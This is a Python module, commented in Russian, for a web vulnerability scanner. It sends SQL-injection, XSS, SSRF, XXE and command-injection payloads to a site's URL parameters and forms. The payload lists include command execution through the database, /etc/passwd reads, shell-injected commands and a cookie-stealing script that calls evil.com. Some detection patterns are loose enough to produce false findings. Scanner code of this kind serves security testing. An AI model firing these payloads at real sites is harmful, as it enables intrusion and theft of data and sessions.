
"""
Расширенный модуль сканера уязвимостей.
Содержит продвинутые техники обнаружения уязвимостей.
"""

import re
import asyncio
import time
from typing import Dict, List, Optional, Any, Tuple
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
import aiohttp
from bs4 import BeautifulSoup
from bs4.element import Tag

from utils.logger import logger
from utils.security import is_safe_url
# Импорты из scanner_fixed.py не используются в этом файле

class AdvancedScanner:
    """Продвинутый сканер уязвимостей с расширенными техниками обнаружения."""

    def __init__(self, max_concurrent: int = 5, timeout: int = 30):
        self.max_concurrent = max_concurrent
        self.timeout = timeout
        self.semaphore = asyncio.Semaphore(max_concurrent)

        # Расширенные паттерны для SQL-инъекций
        self.advanced_sql_patterns = [
            re.compile(r"ORA-[0-9]{5}", re.IGNORECASE),  # Oracle ошибки
            re.compile(r"Microsoft OLE DB Provider", re.IGNORECASE),  # MS SQL ошибки
            re.compile(r"PostgreSQL query failed", re.IGNORECASE),  # PostgreSQL ошибки
            re.compile(r"Warning: mysql_", re.IGNORECASE),  # MySQL предупреждения
            re.compile(r"valid MySQL result", re.IGNORECASE),  # MySQL ошибки
            re.compile(r"PostgreSQL query failed", re.IGNORECASE),  # PostgreSQL ошибки
            re.compile(r"SQLite/JDBCDriver", re.IGNORECASE),  # SQLite ошибки
            re.compile(r"SQLSTATE\[", re.IGNORECASE),  # Общие ошибки SQL
        ]

        # Расширенные XSS-паттерны
        self.advanced_xss_patterns = [
            re.compile(r"on\w+\s*=", re.IGNORECASE),  # Обработчики событий
            re.compile(r"javascript:", re.IGNORECASE),  # JavaScript протокол
            re.compile(r"<\w+[^>]*on\w+\s*=", re.IGNORECASE),  # Теги с обработчиками
        ]

        # Паттерны для SSRF (Server-Side Request Forgery)
        self.ssrf_patterns = [
            re.compile(r"root:.*:0:0", re.IGNORECASE),  # /etc/passwd
            re.compile(r"127\.0\.0\.1", re.IGNORECASE),  # localhost
            re.compile(r"localhost", re.IGNORECASE),
            re.compile(r"0\.0\.0\.0", re.IGNORECASE),
            re.compile(r"169\.254\.", re.IGNORECASE),  # Link-local
            re.compile(r"192\.168\.", re.IGNORECASE),  # Private network
            re.compile(r"10\.", re.IGNORECASE),  # Private network
            re.compile(r"172\.(1[6-9]|2[0-9]|3[0-1])\.", re.IGNORECASE),  # Private network
        ]

        # Паттерны для XXE (XML External Entity)
        self.xxe_patterns = [
            re.compile(r"<!ENTITY", re.IGNORECASE),
            re.compile(r"SYSTEM.*file", re.IGNORECASE),
            re.compile(r"<!DOCTYPE.*\[", re.IGNORECASE),
        ]

        # Паттерны для RCE (Remote Code Execution)
        self.rce_patterns = [
            re.compile(r"root:.*:0:0", re.IGNORECASE),  # /etc/passwd
            re.compile(r"uid=\d+\(.*\) gid=\d+\(.*\)", re.IGNORECASE),  # whoami
            re.compile(r"total \d+", re.IGNORECASE),  # ls -la
            re.compile(r"directory of", re.IGNORECASE),  # dir
            re.compile(r"volume in drive", re.IGNORECASE),  # dir
        ]

        # Расширенные SQL-пейлоады
        self.advanced_sql_payloads = [
            "'; WAITFOR DELAY '00:00:05'--",  # Time-based для MS SQL
            "'; SELECT pg_sleep(5)--",  # Time-based для PostgreSQL
            "'; SELECT SLEEP(5)--",  # Time-based для MySQL
            "'; EXEC xp_cmdshell('ping 127.0.0.1')--",  # Command execution для MS SQL
            "'; COPY (SELECT '') TO PROGRAM 'ping 127.0.0.1'--",  # Command execution для PostgreSQL
            "'; UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5--",  # File read для MySQL
        ]

        # Расширенные XSS-пейлоады
        self.advanced_xss_payloads = [
            "<script>document.location='http://evil.com/?c='+document.cookie</script>",
            "<svg><animate xlink:href=# onbegin=alert(1)></animate></svg>",
            "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
            "<math><maction actiontype=statusline#x onmouseover=alert(1)>X</maction></math>",
            "<body oninput=alert(1)><input autofocus>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>X</marquee>",
        ]

        # SSRF-пейлоады
        self.ssrf_payloads = [
            "http://127.0.0.1:22",
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            "http://127.0.0.1:3306",
            "http://127.0.0.1:5432",
            "http://127.0.0.1:6379",
            "http://127.0.0.1:11211",
            "file:///etc/passwd",
            "file:///etc/hosts",
            "file:///windows/system32/drivers/etc/hosts",
        ]

        # XXE-пейлоады
        self.xxe_payloads = [
            """<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
            <foo>&xxe;</foo>""",
            """<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "file:///windows/system32/drivers/etc/hosts" >]>
            <foo>&xxe;</foo>""",
        ]

        # RCE-пейлоады
        self.rce_payloads = [
            "; whoami",
            "; id",
            "; ls -la",
            "; dir",
            "; cat /etc/passwd",
            "; type c:\\windows\\system32\\drivers\\etc\\hosts",
            "; ping -c 5 127.0.0.1",
            "; ping -n 5 127.0.0.1",
        ]

    async def advanced_sql_injection_check(self, session: aiohttp.ClientSession, url: str, 
                                         forms: Optional[List[Tag]] = None) -> Optional[str]:
        """
        Расширенная проверка на SQL-инъекции с использованием time-based атак.

        Args:
            session: aiohttp сессия
            url: URL для проверки
            forms: Список форм на странице

        Returns:
            Optional[str]: Описание найденной уязвимости или None
        """
        if forms is None:
            forms = []

        try:
            # Проверяем параметры URL
            if '?' in url:
                for payload in self.advanced_sql_payloads[:3]:  # Используем только time-based пейлоады
                    if self.semaphore:
                        async with self.semaphore:
                            test_url = self._inject_payload_into_url(url, payload)
                            start_time = time.time()

                            result = await session.get(test_url)
                            elapsed_time = time.time() - start_time

                            if elapsed_time >= 4:  # Если ответ занял >= 4 секунды
                                return f"Time-based SQL injection vulnerability detected with payload: {payload}"

            # Проверяем формы
            for form in forms:
                if self.semaphore:
                    async with self.semaphore:
                        action = urljoin(url, str(form.get('action', '')))
                        method = str(form.get('method', 'get')).upper()

                        # Создаем тестовые данные для формы
                        form_data: Dict[str, str] = {}
                        input_elements = form.find_all('input')[:3]  # Максимум 3 поля

                        for input_elem in input_elements:
                            input_name = str(input_elem.get('name', ''))
                            if input_name and input_elem.get('type') in ['text', 'password', 'email', 'search', 'url']:
                                # Используем time-based пейлоад
                                form_data[input_name] = self.advanced_sql_payloads[0]

                        if form_data:
                            start_time = time.time()

                            if method == 'POST':
                                result = await session.post(action, data=form_data)
                            else:
                                test_url = f"{action}?{urlencode(form_data)}"
                                result = await session.get(test_url)

                            elapsed_time = time.time() - start_time

                            if elapsed_time >= 4:  # Если ответ занял >= 4 секунды
                                return f"Time-based SQL injection vulnerability detected in form to {action}"

            return None

        except Exception as e:
            logger.error(f"Error in advanced SQL injection check: {e}")
            return None

    async def advanced_xss_check(self, session: aiohttp.ClientSession, url: str, 
                               forms: Optional[List[Tag]] = None) -> Optional[str]:
        """
        Расширенная проверка на XSS-уязвимости с использованием продвинутых пейлоадов.

        Args:
            session: aiohttp сессия
            url: URL для проверки
            forms: Список форм на странице

        Returns:
            Optional[str]: Описание найденной уязвимости или None
        """
        if forms is None:
            forms = []

        try:
            # Проверяем параметры URL
            if '?' in url:
                for payload in self.advanced_xss_payloads[:3]:  # Используем только 3 пейлоада
                    if self.semaphore:
                        async with self.semaphore:
                            test_url = self._inject_payload_into_url(url, payload)
                            result = await session.get(test_url)

                            if result:
                                content = await result.text()
                                # Проверяем наличие пейлоада в ответе
                                if payload in content:
                                    return f"Advanced XSS vulnerability detected with payload: {payload}"

            # Проверяем формы
            for form in forms:
                if self.semaphore:
                    async with self.semaphore:
                        action = urljoin(url, str(form.get('action', '')))
                        method = str(form.get('method', 'get')).upper()

                        # Создаем тестовые данные для формы
                        form_data: Dict[str, str] = {}
                        input_elements = form.find_all('input')[:3]  # Максимум 3 поля

                        for input_elem in input_elements:
                            input_name = str(input_elem.get('name', ''))
                            if input_name and input_elem.get('type') in ['text', 'password', 'email', 'search', 'url']:
                                # Используем продвинутый пейлоад
                                form_data[input_name] = self.advanced_xss_payloads[0]

                        if form_data:
                            if method == 'POST':
                                result = await session.post(action, data=form_data)
                            else:
                                test_url = f"{action}?{urlencode(form_data)}"
                                result = await session.get(test_url)

                            if result:
                                content = await result.text()
                                # Проверяем наличие пейлоада в ответе
                                if self.advanced_xss_payloads[0] in content:
                                    return f"Advanced XSS vulnerability detected in form to {action}"

            return None

        except Exception as e:
            logger.error(f"Error in advanced XSS check: {e}")
            return None

    async def ssrf_check(self, session: aiohttp.ClientSession, url: str, 
                        forms: Optional[List[Tag]] = None) -> Optional[str]:
        """
        Проверка на SSRF-уязвимости.

        Args:
            session: aiohttp сессия
            url: URL для проверки
            forms: Список форм на странице

        Returns:
            Optional[str]: Описание найденной уязвимости или None
        """
        if forms is None:
            forms = []

        try:
            # Проверяем параметры URL
            if '?' in url:
                for payload in self.ssrf_payloads[:5]:  # Используем только 5 пейлоадов
                    if self.semaphore:
                        async with self.semaphore:
                            test_url = self._inject_payload_into_url(url, payload)
                            result = await session.get(test_url)

                            if result:
                                content = await result.text()
                                # Проверяем наличие паттернов в ответе
                                if any(pattern.search(content) for pattern in self.ssrf_patterns):
                                    return f"SSRF vulnerability detected with payload: {payload}"

            # Проверяем формы
            for form in forms:
                if self.semaphore:
                    async with self.semaphore:
                        action = urljoin(url, str(form.get('action', '')))
                        method = str(form.get('method', 'get')).upper()

                        # Создаем тестовые данные для формы
                        form_data: Dict[str, str] = {}
                        input_elements = form.find_all('input')[:3]  # Максимум 3 поля

                        for input_elem in input_elements:
                            input_name = str(input_elem.get('name', ''))
                            if input_name and input_elem.get('type') in ['text', 'password', 'email', 'search', 'url']:
                                # Используем SSRF пейлоад
                                form_data[input_name] = self.ssrf_payloads[0]

                        if form_data:
                            if method == 'POST':
                                result = await session.post(action, data=form_data)
                            else:
                                test_url = f"{action}?{urlencode(form_data)}"
                                result = await session.get(test_url)

                            if result:
                                content = await result.text()
                                # Проверяем наличие паттернов в ответе
                                if any(pattern.search(content) for pattern in self.ssrf_patterns):
                                    return f"SSRF vulnerability detected in form to {action}"

            return None

        except Exception as e:
            logger.error(f"Error in SSRF check: {e}")
            return None

    async def xxe_check(self, session: aiohttp.ClientSession, url: str, 
                       forms: Optional[List[Tag]] = None) -> Optional[str]:
        """
        Проверка на XXE-уязвимости.

        Args:
            session: aiohttp сессия
            url: URL для проверки
            forms: Список форм на странице

        Returns:
            Optional[str]: Описание найденной уязвимости или None
        """
        if forms is None:
            forms = []

        try:
            # Проверяем формы, которые могут принимать XML
            for form in forms:
                if self.semaphore:
                    async with self.semaphore:
                        action = urljoin(url, str(form.get('action', '')))
                        method = str(form.get('method', 'get')).upper()

                        # Ищем поля, которые могут принимать XML
                        xml_fields = []
                        input_elements = form.find_all(['input', 'textarea'])

                        for input_elem in input_elements:
                            input_name = str(input_elem.get('name', ''))
                            if input_name and (
                                'xml' in input_name.lower() or 
                                'data' in input_name.lower() or
                                'config' in input_name.lower() or
                                input_elem.get('type') in ['text', 'textarea', 'hidden']
                            ):
                                xml_fields.append(input_name)

                        if xml_fields:
                            # Создаем тестовые данные для формы
                            form_data: Dict[str, str] = {}
                            for field in xml_fields:
                                # Используем XXE пейлоад
                                form_data[field] = self.xxe_payloads[0]

                            if method == 'POST':
                                # Устанавливаем правильный Content-Type для XML
                                headers = {'Content-Type': 'application/xml'}
                                # Отправляем XML как строку, а не как словарь
                                xml_data = self.xxe_payloads[0]
                                result = await session.post(action, data=xml_data, headers=headers)
                            else:
                                test_url = f"{action}?{urlencode(form_data)}"
                                result = await session.get(test_url)

                            if result:
                                content = await result.text()
                                # Проверяем наличие паттернов в ответе
                                if any(pattern.search(content) for pattern in self.xxe_patterns):
                                    return f"XXE vulnerability detected in form to {action}"

            return None

        except Exception as e:
            logger.error(f"Error in XXE check: {e}")
            return None

    async def rce_check(self, session: aiohttp.ClientSession, url: str, 
                       forms: Optional[List[Tag]] = None) -> Optional[str]:
        """
        Проверка на RCE-уязвимости.

        Args:
            session: aiohttp сессия
            url: URL для проверки
            forms: Список форм на странице

        Returns:
            Optional[str]: Описание найденной уязвимости или None
        """
        if forms is None:
            forms = []

        try:
            # Проверяем параметры URL
            if '?' in url:
                for payload in self.rce_payloads[:3]:  # Используем только 3 пейлоада
                    if self.semaphore:
                        async with self.semaphore:
                            test_url = self._inject_payload_into_url(url, payload)
                            result = await session.get(test_url)

                            if result:
                                content = await result.text()
                                # Проверяем наличие паттернов в ответе
                                if any(pattern.search(content) for pattern in self.rce_patterns):
                                    return f"RCE vulnerability detected with payload: {payload}"

            # Проверяем формы
            for form in forms:
                if self.semaphore:
                    async with self.semaphore:
                        action = urljoin(url, str(form.get('action', '')))
                        method = str(form.get('method', 'get')).upper()

                        # Ищем поля, которые могут выполнять команды
                        cmd_fields = []
                        input_elements = form.find_all(['input', 'textarea'])

                        for input_elem in input_elements:
                            input_name = str(input_elem.get('name', ''))
                            if input_name and (
                                'cmd' in input_name.lower() or 
                                'command' in input_name.lower() or
                                'exec' in input_name.lower() or
                                'run' in input_name.lower() or
                                'ping' in input_name.lower() or
                                'query' in input_name.lower() or
                                'search' in input_name.lower() or
                                input_elem.get('type') in ['text', 'textarea']
                            ):
                                cmd_fields.append(input_name)

                        if cmd_fields:
                            # Создаем тестовые данные для формы
                            form_data: Dict[str, str] = {}
                            for field in cmd_fields:
                                # Используем RCE пейлоад
                                form_data[field] = self.rce_payloads[0]

                            if method == 'POST':
                                result = await session.post(action, data=form_data)
                            else:
                                test_url = f"{action}?{urlencode(form_data)}"
                                result = await session.get(test_url)

                            if result:
                                content = await result.text()
                                # Проверяем наличие паттернов в ответе
                                if any(pattern.search(content) for pattern in self.rce_patterns):
                                    return f"RCE vulnerability detected in form to {action}"

            return None

        except Exception as e:
            logger.error(f"Error in RCE check: {e}")
            return None

    def _inject_payload_into_url(self, url: str, payload: str) -> str:
        """Внедряет пейлоад в параметры URL."""
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)

        # Если параметры есть, внедряем пейлоад в первый параметр
        if query_params:
            first_param = list(query_params.keys())[0]
            query_params[first_param] = [payload]
        else:
            # Если параметров нет, добавляем новый
            query_params = {'param': [payload]}

        # Собираем URL обратно
        new_query = urlencode(query_params, doseq=True)
        return url.replace(parsed_url.query, new_query)

    async def comprehensive_scan(self, session: aiohttp.ClientSession, url: str, 
                               forms: Optional[List[Tag]] = None) -> List[str]:
        """
        Комплексное сканирование на все типы уязвимостей.

        Args:
            session: aiohttp сессия
            url: URL для проверки
            forms: Список форм на странице

        Returns:
            List[str]: Список найденных уязвимостей
        """
        vulnerabilities = []

        # Запускаем все проверки параллельно
        tasks = [
            self.advanced_sql_injection_check(session, url, forms),
            self.advanced_xss_check(session, url, forms),
            self.ssrf_check(session, url, forms),
            self.xxe_check(session, url, forms),
            self.rce_check(session, url, forms)
        ]

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for result in results:
            if isinstance(result, str):  # Если найдена уязвимость
                vulnerabilities.append(result)
            elif isinstance(result, Exception):  # Если произошла ошибка
                logger.error(f"Error during vulnerability scan: {result}")
        
        return vulnerabilities
